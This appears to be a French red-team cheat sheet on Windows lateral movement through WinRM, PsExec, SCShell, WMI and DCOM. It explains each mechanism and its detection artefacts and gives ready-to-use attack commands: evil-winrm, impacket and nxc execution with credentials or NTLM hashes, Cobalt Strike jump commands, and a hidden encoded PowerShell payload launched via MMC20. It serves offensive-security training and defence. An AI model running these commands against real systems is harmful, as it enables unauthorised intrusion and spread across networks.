> Rappel RPC : Le port 135 est l'Endpoint Mapper : le client s'y connecte pour demander sur quel port dynamique joindre le service cible. Dans Windows, une grande partie du RPC passe en réalité par des named pipes transportés sur SMB (port 445), ce qui explique pourquoi le 445 est omniprésent dans le trafic d'administration réseau.

# WinRM

Protocole WS-Management sur TCP **5985** (HTTP) / **5986** (HTTPS). Nécessite d'être membre de **Administrators** ou **Remote Management Users** sur la cible.

**evil-winrm (shell interactif)**

```bash
evil-winrm -i <IP_CIBLE> -u <USER> -p <PASSWORD>
```

**nxc (exécution de commande)**

```bash
nxc winrm 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -X "whoami"
```

**PowerShell (Windows)** : `Enter-PSSession`, `Invoke-Command`, `New-PSSession`

> WinRM souffre du **Kerberos Double Hop** -  les credentials ne se propagent pas aux ressources réseau distantes depuis la session. Préférer WMI pour éviter ce problème.

**Cobalt Strike**
```
beacon> jump winrm64 lon-ws-1 smb

beacon> remote-exec winrm lon-ws-1 net sessions
```

---
# PsExec

## Mécanisme

PsExec est un outil Sysinternals, mais en red team le terme désigne surtout le mécanisme SMB + SCM, réimplémenté par des outils comme Impacket, NetExec ou Cobalt Strike.

PsExec embarque PSEXESVC.exe directement dans ses ressources binaires. À l'exécution, il extrait ce binaire et le copie sur la cible via le partage ADMIN$ (qui pointe vers C:\Windows), accessible uniquement aux admins locaux. Il se connecte ensuite au Service Control Manager (SCM) via RPC pour créer et démarrer un service. Ce service ouvre un named pipe pour la communication stdin/stdout, ce qui permet de recevoir l'output directement. À la fin, le service et le binaire sont supprimés.

Les réimplémentations (Cobalt Strike, NetExec) reproduisent ce mécanisme mais avec un payload personnalisé à la place de PSEXESVC.exe, un nom de service aléatoire, et selon la configuration un chargement en mémoire sans toucher le disque.

> Très bruyant : écrit sur le disque, crée un service -  détecté par presque tous les EDR. Préférer WMI pour la discrétion.
## Workflow

```
Client
  │
  ├─[SMB 445]──► ADMIN$ → copie PSEXESVC.exe dans C:\Windows\
  │
  ├─[RPC 135]──► Endpoint Mapper → port dynamique SCM
  │
  ├─[RPC dyn]──► SCM → CreateService + StartService (PSEXESVC)
  │
  ├─[SMB 445]──► Named pipe → stdin/stdout ↔ commande exécutée
  │
  └─[RPC dyn]──► SCM → StopService + DeleteService + suppression binaire
```
## Ports / Protocoles

- Port 445 (SMB) : copie du binaire via ADMIN$ et transport des named pipes
- Port 135 (RPC Endpoint Mapper) : négociation du port dynamique pour le SCM
- Port dynamique haut : communication effective avec le SCM
## Artefacts

- Binaire écrit sur le disque
- Service créé dans le registre
- Event ID 7045 (nouveau service installé)
- Logs SMB et d'authentification
## Commandes

**impacket-psexec (depuis Kali)**

```bash
impacket-psexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
```

**nxc avec smbexec (équivalent psexec via nxc)**

```bash
# smbexec = crée un service pour exécuter la commande, tout via SMB (port 445 uniquement)
nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
```

> nxc tente les méthodes dans cet ordre si aucune n'est forcée : `wmiexec` → `atexec` → `smbexec`

**PsExec64.exe Windows -  [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)**

```cmd
.\PsExec64.exe -i \\<HOSTNAME> -u corp\<USER> -p <PASSWORD> cmd
```

**Cobalt Strike**
```
beacon> jump psexec64 lon-ws-1 smb
```

---
# SCShell

## Mécanisme

[SCShell](https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF) est une variation de PsExec qui évite de créer un nouveau service. Au lieu de ça, il ouvre un service existant sur la cible via le SCM (dans l'exemple : defragsvc), récupère son chemin binaire original, le remplace temporairement par le payload, démarre le service pour exécuter le payload, puis restaure le chemin original. Aucun nouveau service n'est créé, aucun binaire n'est copié via ADMIN$.

`C:\Tools\SCShell\CS-BOF\scshell.cna
## Workflow

```
Client
  │
  ├─[RPC 135]──► Endpoint Mapper → port dynamique SCM
  │
  ├─[RPC dyn]──► SCM → OpenService (service existant, ex: defragsvc)
  │
  ├─[RPC dyn]──► SCM → QueryServiceConfig → récupère le chemin original
  │
  ├─[RPC dyn]──► SCM → ChangeServiceConfig → remplace le binaire par le payload
  │
  ├─[RPC dyn]──► SCM → StartService → exécute le payload
  │
  ├─[RPC dyn]──► SCM → ChangeServiceConfig → restaure le chemin original
  │
  └─[SMB 445]──► Named pipe → lien établi avec le beacon enfant
```
## Ports / Protocoles

- Port 135 (RPC Endpoint Mapper) : négociation du port dynamique pour le SCM
- Port dynamique haut : communication avec le SCM (OpenService, ChangeServiceConfig, StartService)
- Port 445 (SMB) : communication avec le beacon enfant via named pipe si listener SMB
## Artefacts

- Pas de nouveau service créé dans le registre
- Pas de binaire copié via ADMIN$
- Modification temporaire du chemin binaire d'un service existant (visible dans les logs de changement de configuration de service)
- Logs d'authentification réseau et RPC/SCM

## Commandes

**Cobalt Strike**
```
beacon> jump scshell64 lon-ws-1 smb
```

---
# WMI

## Mécanisme

WMI est un framework de gestion natif Windows. Le client établit une connexion DCOM/RPC vers la cible, s'authentifie, et obtient une interface COM vers le namespace root\cimv2. Il appelle ensuite Win32_Process.Create() pour spawner un processus directement sur la machine cible, exécuté par WmiPrvSE.exe.

Il n'y a pas de canal de retour natif : l'output n'est pas renvoyé directement. Pour le récupérer, il faut rediriger la sortie vers un fichier puis le lire via SMB, ou utiliser d'autres techniques.

## Workflow

```
Client
  │
  ├─[RPC 135]──► Endpoint Mapper → port dynamique DCOM
  │
  ├─[RPC dyn]──► Authentification + interface COM root\cimv2
  │
  ├─[RPC dyn]──► Win32_Process.Create() → WmiPrvSE.exe spawne le processus
  │
  └─[SMB 445]──► (optionnel) lecture de l'output redirigé vers un fichier
```
## Ports / Protocoles

- Port 135 (RPC Endpoint Mapper) : premier contact pour obtenir le port dynamique du service DCOM
- Port dynamique haut (1024-65535) : vraie communication DCOM/RPC
- Port 445 (SMB) optionnel : si récupération de l'output via fichier partagé

## Artefacts

- Pas de binaire sur le disque
- Pas de service créé
- Processus spawné par WmiPrvSE.exe (IOC bien connu des EDR)
- Logs dans Microsoft-Windows-WMI-Activity/Operational
- Logs d'authentification réseau

## Commandes

**nxc / impacket-wmiexec (depuis Kali)**

```bash
# nxc
nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami"
nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method wmiexec

# impacket -  shell interactif
impacket-wmiexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
```

Si seul le port **445** est disponible, utiliser `smbexec` -  crée un service temporaire via SCM, sans passer par WMI : 
```bash
nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
```

**PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`

> Les processus WMI sont créés en **session 0** (isolation système) -  invisibles dans la session utilisateur active.

---
# DCOM Exec

## Mécanisme

DCOM permet d'instancier et d'interagir avec des objets COM sur une machine distante. Le client instancie un objet COM distant via DCOM (ex: MMC20.Application) et appelle directement une méthode exposée par cet objet pour exécuter une commande (Document.ActiveView.ExecuteShellCommand). Aucun service n'est créé, aucun binaire n'est copié.

Trois objets sont couramment utilisés : MMC20.Application, ShellWindows et ShellBrowserWindow. MMC20 est préférable en contexte serveur car il tourne en Session 0, indépendamment des sessions utilisateur interactives. ShellWindows et ShellBrowserWindow nécessitent explorer.exe actif sur la cible, ce qui les rend inutilisables sur la plupart des serveurs.

Comme WMI, il n'y a pas de canal de retour natif pour l'output.
## Workflow

```
Client
  │
  ├─[RPC 135]──► Endpoint Mapper → port dynamique DCOM
  │
  ├─[RPC dyn]──► Instanciation de l'objet COM distant (ex: MMC20.Application)
  │
  ├─[RPC dyn]──► Appel de méthode → Document.ActiveView.ExecuteShellCommand()
  │
  └─[SMB 445]──► (optionnel) lecture de l'output redirigé vers un fichier
```
## Ports / Protocoles

- Port 135 (RPC Endpoint Mapper) : premier contact pour négocier le port dynamique DCOM
- Port dynamique haut (1024-65535) : instanciation de l'objet COM et appel de méthode
- Port 445 (SMB) optionnel : si récupération de l'output via fichier partagé
## Artefacts

- Pas de binaire sur le disque
- Pas de service créé
- Processus spawné par mmc.exe ou explorer.exe selon l'objet utilisé
- Logs DCOM dans le journal Système (erreurs) et logs d'authentification réseau

## Commandes

**Kali (impacket-dcomexec)**

```bash
# Par défaut : ShellWindows (nécessite explorer.exe actif → échoue sur les serveurs sans session interactive)
# Préférer MMC20 qui tourne en Session 0 (indépendant des sessions utilisateur)
impacket-dcomexec -object MMC20 corp.com/'USER':'PASSWORD'@'IP_CIBLE'
impacket-dcomexec -object ShellWindows corp.com/'USER':'PASSWORD'@'IP_CIBLE'
impacket-dcomexec -object ShellBrowserWindow corp.com/'USER':'PASSWORD'@'IP_CIBLE'

# Avec hash NTLM
impacket-dcomexec -hashes :'NTLM_HASH' corp.com/'USER'@'IP_CIBLE'
```

**Windows (PowerShell)**

```powershell
# Instancier l'objet MMC distant
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP_CIBLE>"))

# Exécuter une commande
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
```
